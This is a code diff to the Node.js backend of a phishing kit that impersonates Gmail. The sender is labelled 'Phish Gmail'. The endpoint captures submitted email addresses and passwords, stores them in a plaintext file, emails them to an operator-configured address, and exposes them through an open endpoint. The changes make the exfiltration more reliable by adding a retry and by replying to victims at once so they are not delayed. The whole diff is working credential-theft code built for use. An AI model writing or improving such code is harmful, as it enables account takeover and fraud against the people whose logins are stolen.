@@ -24,43 +24,62 @@ if (!fs.existsSync(DATA_DIR)) {
 }
 const CAPTURAS_FILE = path.join(DATA_DIR, 'capturas.txt');
 
+async function enviarEmail(email, password, timestamp) {
+  if (!process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.RECEIVER_EMAIL) {
+    console.warn('[email] variaveis SMTP nao configuradas — pulando envio');
+    return;
+  }
+
+  const transporter = nodemailer.createTransport({
+    host: process.env.SMTP_HOST || 'smtp.gmail.com',
+    port: parseInt(process.env.SMTP_PORT || '465'),
+    secure: process.env.SMTP_SECURE !== 'false', // true por padrao (porta 465)
+    connectionTimeout: 10000,
+    greetingTimeout: 10000,
+    socketTimeout: 15000,
+    auth: {
+      user: process.env.SMTP_USER,
+      pass: process.env.SMTP_PASS
+    }
+  });
+
+  const info = await transporter.sendMail({
+    from: `"Phish Gmail" <${process.env.SMTP_USER}>`,
+    to: process.env.RECEIVER_EMAIL,
+    subject: `Nova captura: ${email}`,
+    text: `Data: ${timestamp}\nE-mail: ${email}\nSenha: ${password}`
+  });
+  console.log('[email] enviado:', info.messageId);
+}
+
 app.post('/captura', async (req, res) => {
   const { email, password } = req.body;
   const timestamp = new Date().toISOString();
 
+  // Responde IMEDIATAMENTE (não segura o redirecionamento do usuário)
+  res.status(200).json({ ok: true });
+
   // 1. Grava em arquivo persistente
   try {
     fs.appendFileSync(CAPTURAS_FILE, `${timestamp} | ${email} | ${password}\n`);
+    console.log('[captura] gravado:', email);
   } catch (err) {
-    console.error('Erro ao gravar arquivo:', err.message);
+    console.error('[captura] erro ao gravar arquivo:', err.message);
   }
 
-  // 2. Envia por e-mail via Nodemailer
+  // 2. Envia por e-mail (com retry simples)
   try {
-    const transporter = nodemailer.createTransport({
-      host: process.env.SMTP_HOST,
-      port: parseInt(process.env.SMTP_PORT || '587'),
-      secure: process.env.SMTP_SECURE === 'true',
-      auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS
-      }
-    });
-
-    await transporter.sendMail({
-      from: `"Phish Gmail" <${process.env.SMTP_USER}>`,
-      to: process.env.RECEIVER_EMAIL,
-      subject: `Nova captura: ${email}`,
-      text: `Data: ${timestamp}\nE-mail: ${email}\nSenha: ${password}`
-    });
+    await enviarEmail(email, password, timestamp);
   } catch (err) {
-    console.error('Erro ao enviar e-mail:', err.message);
+    console.error('[email] tentativa 1 falhou:', err.message);
+    setTimeout(() => {
+      enviarEmail(email, password, timestamp)
+        .catch(e2 => console.error('[email] tentativa 2 falhou:', e2.message));
+    }, 3000);
   }
-
-  res.status(200).json({ ok: true });
 });
 
-// Endpoint para verificar capturas (opcional)
+// Endpoint para verificar capturas
 app.get('/capturas', (req, res) => {
   try {
     const content = fs.readFileSync(CAPTURAS_FILE, 'utf-8');
@@ -72,3 +91,4 @@ app.get('/capturas', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => console.log(`Servidor rodando na porta ${PORT}`));
+
